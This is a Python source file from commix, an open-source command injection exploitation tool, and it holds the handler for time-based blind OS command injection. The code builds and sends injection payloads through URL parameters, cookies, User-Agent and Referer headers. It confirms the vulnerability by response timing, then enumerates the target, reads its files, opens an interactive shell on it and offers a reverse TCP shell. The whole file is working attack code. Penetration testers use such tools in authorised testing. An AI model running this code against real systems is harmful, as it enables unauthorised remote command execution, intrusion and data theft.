#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import session_handler

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.shells import reverse_tcp
from src.core.requests import parameters
from src.core.injections.controller import checks

from src.core.injections.blind.techniques.time_based import tb_injector
from src.core.injections.blind.techniques.time_based import tb_payloads
from src.core.injections.blind.techniques.time_based import tb_enumeration
from src.core.injections.blind.techniques.time_based import tb_file_access

readline_error = False
try:
  import readline
except ImportError:
  if settings.IS_WINDOWS:
    try:
      import pyreadline as readline
    except ImportError:
      readline_error = True
  else:
    try:
      import gnureadline as readline
    except ImportError:
      readline_error = True
  pass


"""
The "time-based" injection technique on Blind OS Command Injection.
"""

"""
The "time-based" injection technique handler.
"""
def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):
  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  is_vulnerable = False
  again_warning = True
  false_positive_warning = False
  export_injection_info = False
  how_long = 0
  how_long_statistic = 0
  injection_type = "Blind Command Injection"
  technique = "time-based injection technique"

  if menu.options.verbose:
    print settings.INFO_SIGN + "Testing the " + technique + "... "

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = settings.MAXLEN
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print Fore.YELLOW + settings.WARNING_SIGN + "The '--url-reload' option is not available in " + technique + "." + Style.RESET_ALL
  
  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))

  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:

        # If a previous session is available.
        if settings.LOAD_SESSION and session_handler. notification(url, technique):
          cmd = shell = ""
          url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
          settings.FOUND_HOW_LONG = how_long
          settings.FOUND_DIFF = how_long - delay

        if settings.RETEST == True:
          settings.RETEST = False
          from src.core.injections.results_based.techniques.classic import cb_handler
          cb_handler.exploitation(url, delay, filename, http_request_method)

        if not settings.LOAD_SESSION:
          num_of_chars = num_of_chars + 1
          # Check for bad combination of prefix and separator
          combination = prefix + separator
          if combination in settings.JUNK_COMBINATION:
            prefix = ""
          
          # Define alter shell
          alter_shell = menu.options.alter_shell
          
          # Change TAG on every request to prevent false-positive results.
          TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
          tag_length = len(TAG) + 4
          
          for output_length in range(1, int(tag_length)):
            try:

              if alter_shell:
                # Time-based decision payload (check if host is vulnerable).
                payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
              else:
                # Time-based decision payload (check if host is vulnerable).
                payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)

              # Fix prefixes / suffixes
              payload = parameters.prefixes(payload, prefix)
              payload = parameters.suffixes(payload, suffix)

              if menu.options.base64:
                payload = base64.b64encode(payload)

              # Check if defined "--verbose" option.
              if menu.options.verbose:
                print Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL

              # Cookie Injection
              if settings.COOKIE_INJECTION == True:
                # Check if target host is vulnerable to cookie injection.
                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)

              # User-Agent Injection
              elif settings.USER_AGENT_INJECTION == True:
                # Check if target host is vulnerable to user-agent injection.
                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                how_long = tb_injector.user_agent_injection_test(url, vuln_parameter, payload)

              # Referer Injection
              elif settings.REFERER_INJECTION == True:
                # Check if target host is vulnerable to referer injection.
                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                how_long = tb_injector.referer_injection_test(url, vuln_parameter, payload)

              else:
                # Check if target host is vulnerable.
                how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)

              # Statistical analysis in time responses.
              how_long_statistic = how_long_statistic + how_long

              # Reset the how_long_statistic counter
              if output_length == tag_length - 1:
                how_long_statistic = 0

              # Injection percentage calculation
              percent = ((num_of_chars * 100) / total)
              float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total * 1.0)),2))

              if percent == 100 and no_result == True:
                if not menu.options.verbose:
                  percent = Fore.RED + "FAILED" + Style.RESET_ALL
                else:
                  percent = ""
              else:
                if (url_time_response == 0 and (how_long - delay) >= 0) or \
                   (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
                   (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :

                  # Time relative false positive fixation.
                  false_positive_fixation = False
                  if len(TAG) == output_length:
                    # Windows targets.
                    if settings.TARGET_OS == "win":
                      if how_long > (how_long_statistic / output_length):
                          false_positive_fixation = True
                      else:
                          false_positive_warning = True
                    # Unix-like targets.
                    else:
                      if delay == 1 and (how_long_statistic == delay) or \
                        delay == 1 and (how_long_statistic == how_long) or \
                        delay > 1 and (how_long_statistic == (output_length + delay)) and \
                        how_long == delay + 1:
                          false_positive_fixation = True
                      else:
                          false_positive_warning = True

                  # Identified false positive warning message.
                  if false_positive_warning and again_warning:
                    again_warning = False
                    warning_msg = settings.WARNING_SIGN + "Unexpected time delays have been identified due to unstable "
                    warning_msg += "requests. This behavior which may lead to false-positive results."
                    sys.stdout.write("\r" + Fore.YELLOW + warning_msg + Style.RESET_ALL)
                    print ""

                  # Check if false positive fixation is True.
                  if false_positive_fixation:
                    false_positive_fixation = False
                    settings.FOUND_HOW_LONG = how_long
                    settings.FOUND_DIFF = how_long - delay
                    randv1 = random.randrange(0, 1)
                    randv2 = random.randrange(1, 2)
                    randvcalc = randv1 + randv2

                    if settings.TARGET_OS == "win":
                      if alter_shell:
                        cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                      else:
                        cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
                    else:
                      cmd = "(" + str(randv1) + " + " + str(randv2) + ")"

                    # Check for false positive resutls
                    how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response)

                    if (url_time_response == 0 and (how_long - delay) >= 0) or \
                       (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
                       (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :
                      
                      if str(output) == str(randvcalc) and len(TAG) == output_length:
                        is_vulnerable = True
                        how_long_statistic = 0
                        if not menu.options.verbose:
                          percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                        else:
                          percent = ""
                    else:
                      break
                  # False positive
                  else:
                    if not menu.options.verbose:
                      percent = str(float_percent)+ "%"
                      sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
                      sys.stdout.flush()
                    continue    
                else:
                  if not menu.options.verbose:
                    percent = str(float_percent)+ "%"
                    sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
                    sys.stdout.flush()
                  continue
              if not menu.options.verbose:
                sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
                sys.stdout.flush()

            except KeyboardInterrupt: 
              raise

            except SystemExit:
              raise

            except:
              break
            break
            
        # Yaw, got shellz! 
        # Do some magic tricks!
        if (url_time_response == 0 and (how_long - delay) >= 0) or \
           (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
           (url_time_response != 0 and (how_long - delay) > 0 and (how_long >= delay + 1)) :  

          if (len(TAG) == output_length) and \
             (is_vulnerable == True or settings.LOAD_SESSION and is_vulnerable == "True"):

            found = True
            no_result = False

            if settings.LOAD_SESSION:
              is_vulnerable = False

            if settings.COOKIE_INJECTION == True: 
              header_name = " Cookie"
              found_vuln_parameter = vuln_parameter
              the_type = " HTTP header"

            elif settings.USER_AGENT_INJECTION == True: 
              header_name = " User-Agent"
              found_vuln_parameter = ""
              the_type = " HTTP header"

            elif settings.REFERER_INJECTION == True: 
              header_name = " Referer"
              found_vuln_parameter = ""
              the_type = " HTTP header"
              
            else:
              header_name = ""
              the_type = " parameter"
              if http_request_method == "GET":
                found_vuln_parameter = parameters.vuln_GET_param(url)
              else :
                found_vuln_parameter = vuln_parameter

            if len(found_vuln_parameter) != 0 :
              found_vuln_parameter = " '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL  + Style.BRIGHT + "'" 
            
            # Print the findings to log file.
            if export_injection_info == False:
              export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
            if vp_flag == True:
              vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
            logs.update_payload(filename, counter, payload) 
            counter = counter + 1

            if not settings.LOAD_SESSION:
              print ""

            # Print the findings to terminal.
            print Style.BRIGHT + "(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
            print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
            print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
            print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL

            if not settings.LOAD_SESSION:
              shell = ""
              session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable)
              is_vulnerable = False
            else:
              settings.LOAD_SESSION = False 
              
            # Check for any enumeration options.
            if settings.ENUMERATION_DONE == True:
              while True:
                enumerate_again = raw_input("\n" + settings.QUESTION_SIGN + "Do you want to enumerate again? [Y/n/q] > ").lower()
                if enumerate_again in settings.CHOISE_YES:
                  tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                  break
                elif enumerate_again in settings.CHOISE_NO: 
                  break
                elif enumerate_again in settings.CHOISE_QUIT:
                  sys.exit(0)
                else:
                  if enumerate_again == "":
                    enumerate_again = "enter"
                  print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                  pass
            else:
              tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)

            # Check for any system file access options.
            if settings.FILE_ACCESS_DONE == True:
              while True:
                file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n/q] > ").lower()
                if file_access_again in settings.CHOISE_YES:
                  tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                  break
                elif file_access_again in settings.CHOISE_NO: 
                  break
                elif file_access_again in settings.CHOISE_QUIT:
                  sys.exit(0)
                else:
                  if file_access_again == "":
                    file_access_again = "enter"
                  print Back.RED + settings.ERROR_SIGN + "'" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
                  pass
            else:
              tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)

            # Check if defined single cmd.
            if menu.options.os_cmd:
              cmd = menu.options.os_cmd
              check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
              # Export injection result
              tb_injector.export_injection_results(cmd, separator, output, check_how_long)
              sys.exit(0)

            # Pseudo-Terminal shell
            go_back = False
            go_back_again = False
            while True:
              if go_back == True:
                break
              gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print ""
                print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
                if readline_error:
                  checks.no_readline_module()
                while True:
                  try:
                    # Tab compliter
                    if not readline_error:
                      readline.set_completer(menu.tab_completer)
                      # MacOSX tab compliter
                      if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
                        readline.parse_and_bind("bind ^I rl_complete")
                      # Unix tab compliter
                      else:
                        readline.parse_and_bind("tab: complete")
                    cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                    cmd = checks.escaped_cmd(cmd)
                    if cmd.lower() in settings.SHELL_OPTIONS:
                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
                      if os_shell_option == False:
                        if no_result == True:
                          return False
                        else:
                          return True 
                      elif os_shell_option == "quit":                    
                        sys.exit(0)
                      elif os_shell_option == "back":
                        go_back = True
                        break
                      elif os_shell_option == "os_shell": 
                          print Fore.YELLOW + settings.WARNING_SIGN + "You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                      elif os_shell_option == "reverse_tcp":
                        # Set up LHOST / LPORT for The reverse TCP connection.
                        reverse_tcp.configure_reverse_tcp()
                        if settings.REVERSE_TCP == False:
                          continue
                        while True:
                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
                            result = checks.check_reverse_tcp_options(settings.LHOST)
                          else:  
                            cmd = reverse_tcp.reverse_tcp_options()
                            result = checks.check_reverse_tcp_options(cmd)
                          if result != None:
                            if result == 0:
                              return False
                            elif result == 1 or result == 2:
                              go_back_again = True
                              settings.REVERSE_TCP = False
                              break
                          # Command execution results.
                          from src.core.injections.results_based.techniques.classic import cb_injector
                          separator = checks.time_based_separators(separator, http_request_method)
                          whitespace = settings.WHITESPACES[0]
                          response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                          # Evaluate injection results.
                          shell = cb_injector.injection_results(response, TAG)
                          # Export injection result
                          if menu.options.verbose:
                            print ""
                          print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection has been failed!" + Style.RESET_ALL
                      else:
                        pass
                      
                    else:
                      print ""
                      # The main command injection exploitation.
                      check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                      # Export injection result
                      tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                      print ""
                  except KeyboardInterrupt: 
                    raise

                  except SystemExit: 
                    raise
                    
              elif gotshell in settings.CHOISE_NO:
                if checks.next_attack_vector(technique, go_back) == True:
                  break
                else:
                  if no_result == True:
                    return False 
                  else:
                    return True  
                    
              elif gotshell in settings.CHOISE_QUIT:
                sys.exit(0)

              else:
                if gotshell == "":
                  gotshell = "enter"
                print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
                pass
              #break
          
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if url_time_response >= settings.SLOW_TARGET_RESPONSE:
    print Fore.YELLOW + settings.WARNING_SIGN + "It is highly recommended, due to serious response delays, to skip the time-based (blind) technique and to continue with the file-based (semiblind) technique." + Style.RESET_ALL 
    go_back = False
    while True:
      if go_back == True:
        return False
      proceed_option = raw_input(settings.QUESTION_SIGN + "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > ").lower()
      if proceed_option.lower() in settings.CHOISE_PROCEED :
        if proceed_option.lower() == "s":
          from src.core.injections.semiblind.techniques.file_based import fb_handler
          fb_handler.exploitation(url, delay, filename, http_request_method, url_time_response)
        elif proceed_option.lower() == "c":
          if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
            return False
        elif proceed_option.lower() == "q":
          raise SystemExit()
      else:
        if proceed_option == "":
          proceed_option = "enter"
        print Back.RED + settings.ERROR_SIGN + "'" + proceed_option + "' is not a valid answer." + Style.RESET_ALL + "\n"
        pass
  else:
    if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
      return False
#eof